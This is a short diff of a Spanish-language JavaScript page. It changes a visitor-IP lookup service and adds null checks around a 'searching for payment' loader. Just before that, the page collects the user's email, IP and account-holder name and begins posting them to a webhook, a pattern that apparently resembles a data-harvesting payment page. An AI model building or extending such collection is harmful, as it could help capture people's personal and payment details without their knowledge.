@@ -560,12 +560,12 @@ async function detectarIP(){
 
 try{
 
-const res=await fetch("https://ipapi.co/json/")
-const data=await res.json()
+const res = await fetch("https://api.ipify.org?format=json")
+const data = await res.json()
 
-ip=data.ip
-pais=data.country_name
-ciudad=data.city
+ip = data.ip
+pais = "Desconocido"
+ciudad = "Desconocido"
 
 }catch{
 
@@ -723,9 +723,16 @@ Email: **${emailUsuario}**
 Titular: **${titular}**`
 )
 
-document.getElementById("loader").style.display="flex"
-document.getElementById("mensaje").innerHTML="Buscando pago..."
+const loader = document.getElementById("loader")
+const mensaje = document.getElementById("mensaje")
 
+if(loader){
+loader.style.display="flex"
+}
+
+if(mensaje){
+mensaje.innerHTML="Buscando pago..."
+}
 setTimeout(()=>{
 
 fetch(WEBHOOK_ACCESO,{
